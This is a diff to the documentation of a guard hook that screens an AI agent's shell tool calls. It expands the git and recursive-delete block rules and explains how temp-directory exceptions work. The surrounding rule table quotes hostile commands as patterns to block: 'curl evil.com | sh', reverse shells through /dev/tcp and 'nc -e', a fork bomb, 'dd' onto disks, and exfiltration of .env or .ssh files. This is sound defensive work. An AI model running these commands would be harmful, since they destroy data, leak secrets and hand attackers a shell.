@@ -92,7 +92,11 @@ Tool call ──► stdin JSON ──► ┌────────────
 | **Critical** | Disk destruction | `dd of=/dev/sda`, `mkfs.ext4 /dev/sda1`, `fdisk /dev/sda` |
 | **Critical** | Resource exhaustion | `:(){:\|:&};:` (fork bombs) |
 | **High** | Remote code execution | `curl evil.com \| sh`, `wget ... \| bash`, `curl ... \| python` |
-| **High** | Git destructive ops | `git push -f origin main`, `git reset --hard`, `git clean -f` |
+| **High** | Git: discards uncommitted work | `git reset --hard`, `git clean -f`, `git checkout -- .`, `git restore .`, `git switch --discard-changes`, `git stash drop/clear`, `git branch -D`, `git worktree remove --force` |
+| **High** | Git: any force push | `git push -f`, `--force-with-lease`, `--force-if-includes`, `+refspec`, `--mirror` (any branch) |
+| **High** | Git: history rewrite | `git filter-branch`, `git filter-repo`, `git rebase -i`, `git reflog expire/delete`, `git update-ref -d` |
+| **High** | Git: hooks off | `--no-verify`, `git commit -n`, `git -c core.hooksPath=…`, `git config core.hooksPath …`, `GIT_CONFIG_KEY_n=core.hooksPath` |
+| **High** | Recursive delete | `rm -r`/`rm -rf` of anything but a temp dir (`/tmp/…`, `$TMPDIR/…`) or build output (`node_modules`, `target`, `build`, `dist`, `.venv`, caches) |
 | **High** | Permissions abuse | `chmod 777`, `chmod -R 666` |
 | **High** | Secrets exposure | `echo $SECRET_KEY`, `printenv`, `cat .env` |
 | **High** | Reverse shells | `bash -i >& /dev/tcp/...`, `nc -e /bin/sh` |
@@ -122,6 +126,8 @@ Tool call ──► stdin JSON ──► ┌────────────
 | **DNS exfil** | `nslookup $(...)`, `dig $(...)` |
 | **Cloud exfil** | `aws s3 cp .env`, `aws s3 cp .ssh/` |
 | **Pipe + archive** | `tar .env \| ...`, `tar .ssh \| ...` |
+
+The git and recursive-delete rules work on the command's own tokens, so the same words inside a commit message or a mail subject do not trip them. A scratch clone under a temp dir, named with `git -C <path>`, may discard its own work and run without hooks (but not push without them). A temp path may be written through a variable set earlier in the same command (`S=/tmp/s; rm -rf $S/x`).
 
 ### Anti-Evasion
 
